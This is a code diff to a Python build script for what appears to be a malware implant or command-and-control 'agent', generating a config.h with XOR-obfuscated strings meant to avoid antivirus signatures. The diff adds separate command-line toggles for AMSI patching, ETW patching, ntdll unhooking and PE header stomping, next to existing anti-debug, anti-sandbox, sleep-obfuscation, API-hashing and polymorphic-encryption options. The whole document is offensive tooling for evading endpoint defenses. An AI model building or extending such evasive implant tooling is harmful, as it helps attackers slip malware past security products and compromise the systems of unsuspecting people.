@@ -72,6 +72,10 @@ def generate_config_h(
     rsa_exponent: bytes,
     no_evasion: bool = False,
     no_sandbox: bool = False,
+    no_unhook: bool = False,
+    no_etw: bool = False,
+    no_amsi: bool = False,
+    no_pe_stomp: bool = False,
     debug: bool = False,
 ):
     """Generate a config.h with XOR-encrypted strings to avoid static AV signatures."""
@@ -156,13 +160,13 @@ def generate_config_h(
 /* ─── Evasion Toggles ─── */
 #define CONFIG_ANTI_DEBUG        {0 if no_evasion else 1}
 #define CONFIG_ANTI_SANDBOX      {0 if (no_evasion or no_sandbox) else 1}
-#define CONFIG_PATCH_AMSI        {0 if no_evasion else 1}
-#define CONFIG_PATCH_ETW         {0 if no_evasion else 1}
-#define CONFIG_UNHOOK_NTDLL      {0 if no_evasion else 1}
+#define CONFIG_PATCH_AMSI        {0 if (no_evasion or no_amsi) else 1}
+#define CONFIG_PATCH_ETW         {0 if (no_evasion or no_etw) else 1}
+#define CONFIG_UNHOOK_NTDLL      {0 if (no_evasion or no_unhook) else 1}
 #define CONFIG_SLEEP_OBFUSCATE   {0 if no_evasion else 1}
 #define CONFIG_STACK_SPOOF       0
 #define CONFIG_INDIRECT_SYSCALLS 0
-#define CONFIG_PE_STOMP          {0 if no_evasion else 1}
+#define CONFIG_PE_STOMP          {0 if (no_evasion or no_pe_stomp) else 1}
 #define CONFIG_API_HASHING       1
 #define CONFIG_MODULE_STOMP      0
 
@@ -202,6 +206,10 @@ def build_agent(
     profile_path: Path = None,
     no_evasion: bool = False,
     no_sandbox: bool = False,
+    no_unhook: bool = False,
+    no_etw: bool = False,
+    no_amsi: bool = False,
+    no_pe_stomp: bool = False,
     debug: bool = False,
     no_crypt: bool = False,
 ) -> Path:
@@ -304,6 +312,10 @@ def build_agent(
         rsa_exponent=rsa_exponent,
         no_evasion=no_evasion,
         no_sandbox=no_sandbox,
+        no_unhook=no_unhook,
+        no_etw=no_etw,
+        no_amsi=no_amsi,
+        no_pe_stomp=no_pe_stomp,
         debug=debug,
     )
 
@@ -443,8 +455,15 @@ def parse_args():
     p.add_argument("--no-evasion", action="store_true",
                    help="Disable all evasion (anti-debug, anti-sandbox, AMSI/ETW patches, sleep obf)")
     p.add_argument("--no-sandbox", action="store_true",
-                   help="Disable anti-sandbox checks only (CPU/RAM/uptime/artifact/VM detection). "
-                        "Keeps anti-debug, AMSI/ETW patches, sleep obf, etc.")
+                   help="Disable anti-sandbox checks only")
+    p.add_argument("--no-unhook", action="store_true",
+                   help="Disable ntdll unhooking only")
+    p.add_argument("--no-etw", action="store_true",
+                   help="Disable ETW patching only")
+    p.add_argument("--no-amsi", action="store_true",
+                   help="Disable AMSI patching only")
+    p.add_argument("--no-pe-stomp", action="store_true",
+                   help="Disable PE header stomping only")
     p.add_argument("--no-crypt", action="store_true",
                    help="Skip polymorphic encryption (output raw agent, useful for debugging)")
     p.add_argument("--debug", action="store_true",
@@ -478,6 +497,10 @@ def main():
             profile_path=args.profile,
             no_evasion=args.no_evasion,
             no_sandbox=args.no_sandbox,
+            no_unhook=args.no_unhook,
+            no_etw=args.no_etw,
+            no_amsi=args.no_amsi,
+            no_pe_stomp=args.no_pe_stomp,
             debug=args.debug,
             no_crypt=args.no_crypt,
         )
